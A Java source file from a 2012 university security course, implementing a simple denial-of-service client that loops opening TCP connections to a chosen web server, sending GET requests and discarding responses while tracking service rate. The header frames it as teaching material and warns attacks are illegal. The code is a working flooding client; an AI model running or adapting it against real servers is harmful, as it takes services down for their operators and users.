/*
 * DOSClient.java
 * Oct 7, 2012
 *
 * Simple Denial-of-Service Client (SDC) for CSEE 477
 * 
 * Copyright (C) 2012 Chandan Raj Rupakheti
 * 
 * This program is created for the propose of understanding some simple 
 * cases of Denial-of-Service attack in an university-level
 * course. The author do not take any responsibility for the use or the misuse 
 * of this program by any party. The author also intends to make it clear that 
 * it is illegal to launch a Denial-of-Service attack of any form and is punishable 
 * by the lab.
 * 
 * This program is free software: you can redistribute it and/or
 * modify it under the terms of the GNU Lesser General Public License 
 * as published by the Free Software Foundation, either 
 * version 3 of the License, or any later version.
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Lesser General Public License for more details.
 * You should have received a copy of the GNU Lesser General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/lgpl.html>.
 */
package dos;

import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintStream;
import java.net.Socket;

/**
 * This class connects to a HTTP web server and asks for a resource file
 * continuously in a loop. While doing this, it first opens a TCP connection,
 * uses a GET request for a file, receives the file and ignores it, and finally
 * closes the connection and iterates the process again and again. If multiple
 * clients coordinate together, then a vulnerable web server can be taken down. 
 * 
 * It implements {@link Runnable} interface to be used with a {@link Thread}.
 *
 * @author Chandan R. Rupakheti
 */
public class DOSClient implements Runnable {
	private String server;
	private int port;
	private String uri;
	private boolean stop;
	private long delay;
	
	private long connections;
	private long serviceTime;
	private DOSAttackWindow window;
	
	public DOSClient(DOSAttackWindow window, String server, int port) {
		this.window = window;
		this.server = server;
		this.port = port;
		this.uri = "/"; // Default root
		this.delay = 500; // 500 millis
		this.stop = false;
		this.connections = 0;
		this.serviceTime = 0;
	}
	
	/**
	 * Get the service rate this client recieves from the server.
	 * It is equal to (number of connections)/(cumulative service time).
	 * 
	 * @return The service rate.
	 */
	public double getServiceRate() {
		if(this.serviceTime == 0)
			return Double.MIN_VALUE;
		double rate = this.connections/(double)this.serviceTime;
		rate = rate * 1000;
		return rate;
	}
	
	/**
	 * Gets the file to be retrieved.
	 * 
	 * @return the uri
	 */
	public String getUri() {
		return uri;
	}

	/**
	 * Sets the file to be retrieved.
	 * 
	 * @param uri the uri to set
	 */
	public void setUri(String uri) {
		this.uri = uri;
	}

	/**
	 * Gets the wait time for attempting next connection in the loop.
	 * 
	 * @return the delay
	 */
	public long getDelay() {
		return delay;
	}

	/**
	 * Sets the wait time for attempting next connection in the loop.
	 * 
	 * @param delay the delay to set
	 */
	public void setDelay(long delay) {
		this.delay = delay;
	}


	/**
	 * Stops the running thread.
	 */
	public void stop() {
		this.stop = true;
	}


	/**
	 * The entry point of the thread.
	 * The main action happens inside this method.
	 */
	public void run() {
		while(!this.stop) {
			long start = System.currentTimeMillis();
			
			Socket socket;
			try {
				// Open socket connection to the server
				socket = new Socket(server, port);
			}
			catch(Exception e) {
				// Report connection error
				window.showSocketException(e);
				continue;
			}

			// Prepare the request buffer
			StringBuffer buffer = new StringBuffer();
			buffer.append("GET " + this.uri + " HTTP/1.1");
			buffer.append("\r\n");
			buffer.append("connection: keep-alive");
			buffer.append("\r\n");
			buffer.append("accept-language: en-us,en;q=0.5");
			buffer.append("\r\n");
			buffer.append("host: localhost:8080");
			buffer.append("\r\n");
			buffer.append("accept-charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7");
			buffer.append("\r\n");
			buffer.append("accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
			buffer.append("\r\n");
			buffer.append("\r\n");
			
			try {
				// Write the request to the socket
				OutputStream outStream = socket.getOutputStream();
				PrintStream printStream = new PrintStream(outStream);
				printStream.print(buffer.toString());
				printStream.flush();
				
				// Read and ignore the request
				InputStream inStream = socket.getInputStream();
				byte[] chunk = new byte[4096]; // read 4KB chunk at a time
				
				// Keep reading until the end but ignore the data. See ";" at the end of while
				// which means do nothing
				while(inStream.read(chunk) != -1);
				
				// Close the socket
				socket.close();
			}
			catch(Exception e) {
				e.printStackTrace();
			}
			
			// Update metrics
			long end = System.currentTimeMillis();
			long diff = end-start;
			this.connections += 1;
			this.serviceTime += diff;

			// Wait for a while
			try {
				Thread.sleep(delay);
			}
			catch(Exception e){}
		}
	}
}
